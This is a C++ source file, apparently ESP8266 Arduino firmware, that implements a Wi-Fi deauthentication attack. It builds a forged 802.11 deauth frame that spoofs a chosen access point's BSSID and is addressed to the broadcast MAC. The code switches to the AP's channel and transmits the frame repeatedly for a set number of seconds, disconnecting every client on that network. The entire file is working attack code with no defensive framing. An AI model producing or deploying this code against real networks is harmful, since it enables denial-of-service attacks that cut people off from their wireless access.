#include "deauther.h"

void deauth(int channel, uint8_t bssid[6], int duration){
  uint8_t deauthPacket[26] = { //defining the preset for the deauthing package
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };

  for (int i = 0; i < 6; i++){ //insert the mac adres into the deauther packet
      deauthPacket[i + 10] = bssid[i];
      deauthPacket[i + 16] = bssid[i];
    }


  //Print the Deauthing package that is send on the serial output
  Serial.printf("\n=====DeautherPacket=====\n");
  for (int i = 0; i < 26; ++i) {
    Serial.print(deauthPacket[i], HEX);
    Serial.printf(", ");
    if (i == 1){Serial.printf("                 //type, subtype c0: deauth (a0: disassociate)\n");}
    if (i == 3){Serial.printf("                  //duration (SDK takes care of that)\n");}
    if (i == 9){Serial.printf("//reciever (target)\n");}
    if (i == 15){Serial.printf("//source (acces point)\n");}
    if (i == 21){Serial.printf("//BSSID (acces point)\n");}
    if (i == 23){Serial.printf("                  //fragment & squence number\n");}
    if (i == 25){Serial.printf("                  //reason code (1 = unspecified reason)");}
  }
  Serial.printf("\n========================\n\n");
  
  int beforeChannel;
  if (channel != WiFi.channel()){
    //store the current channel and change to the channel of the acces point
    beforeChannel = WiFi.channel();
    wifi_set_channel(channel);
    Serial.print("Changing to channel: " + String(channel) + "\n");
    delay(100);
  }

  int i = 0;
  for (int start = millis(); millis() - start < duration * 1000; i++) {
    int sent = wifi_send_pkt_freedom(deauthPacket, 26, 0); //send the deauthing package
    if (sent != 0){ //check if the package was send succesfully and print the result out
      Serial.print("error while sending the package:(error code: "+ String(sent) +")\n");
    }
    delay(10);
  }
  if (channel != WiFi.channel()){
    //change back to the channel the the esp was on before the deauthing attack
    Serial.print("Changing back to channel: " + String(beforeChannel) + "\n");
    wifi_set_channel(beforeChannel);
  }
  
  Serial.printf("Done Deauthing\n");
}